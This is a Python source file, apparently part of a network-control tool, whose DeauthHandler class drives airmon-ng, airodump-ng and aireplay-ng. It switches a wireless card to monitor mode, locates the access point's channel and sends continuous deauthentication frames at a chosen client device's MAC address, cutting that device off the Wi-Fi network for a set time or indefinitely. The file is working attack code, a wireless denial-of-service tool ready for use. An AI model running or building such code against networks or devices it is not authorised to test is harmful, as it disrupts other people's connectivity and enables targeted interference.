from subprocess import run, Popen, PIPE, DEVNULL
from network.host import Host
from util.usersettings import UserSettings
from time import time, sleep
import threading

class DeauthHandler():
    deauths = []
    is_card_monitor_mode = False

    @staticmethod
    def __check_enable_monitor_mode():
        if not DeauthHandler.is_card_monitor_mode:
            command = ["airmon-ng", "start", UserSettings.get_instance().mon_disabled_interface]
            run(command, stdout=DEVNULL)
            DeauthHandler.is_card_monitor_mode = True

    @staticmethod
    def __check_disable_monitor_mode():
        if DeauthHandler.is_card_monitor_mode:
            command = ["airmon-ng", "stop", UserSettings.get_instance().mon_enabled_interface]
            run(command, stdout=DEVNULL)
            DeauthHandler.is_card_monitor_mode = False

    @staticmethod
    def __find_wifi_channel():
        find_channel_command = ["airodump-ng", UserSettings.get_instance().mon_enabled_interface]

        airodump = Popen(find_channel_command, stdout=PIPE)

        start_time = time()
        while True:
            if time() - start_time > 5:
                raise TimeoutError("Wifi channel search timed out")
            l = airodump.stdout.readline().decode().split()

            for i in range(len(l)):
                if l[i] == UserSettings.get_instance().ap_mac_address:
                    if i + 5 < len(l):
                        print("Found wifi channel:", l[i + 5])
                        return l[i+5]

    @staticmethod
    def deauth_device(host: Host, duration=-1):

        def thread_target():
            DeauthHandler.__check_enable_monitor_mode()

            set_channel = ["airodump-ng", "-c", DeauthHandler.__find_wifi_channel(),
                           UserSettings.get_instance().mon_enabled_interface]

            # Run the airodump command to set the wifi card to the correct channel
            channel_finder = Popen(set_channel, stdout=PIPE, stderr=DEVNULL)
            sleep(0.1)

            deauth_command = ["aireplay-ng", "-0", "0", "-a", UserSettings.get_instance().ap_mac_address,
                              "-c", host.mac_address, UserSettings.get_instance().mon_enabled_interface]

            print("Killing connection with:", " ".join(deauth_command))
            for i in range(20): # Make a maximum of 20 attempts
                deauth_process = Popen(deauth_command, stdout=PIPE, stderr=DEVNULL)
                try:
                    deauth_process.wait(timeout=5)
                except:
                    # If we get a TimeoutExpired exception, it means the deauth process started successfully
                    print("Deauthes are being sent to ", host.get_GUI_name())
                    DeauthHandler.deauths.append(deauth_process)
                    break
                print("Failed to send deauth. trying again")
                continue

            channel_finder.kill()

            if duration > 0:
                sleep(duration)
                deauth_process.kill()
                print("Deauth for {} seconds completed.".format(duration))
                DeauthHandler.deauths.remove(deauth_process)
                if len(DeauthHandler.deauths) == 0:
                    DeauthHandler.__check_disable_monitor_mode()

        t = threading.Thread(target=thread_target)
        t.start()

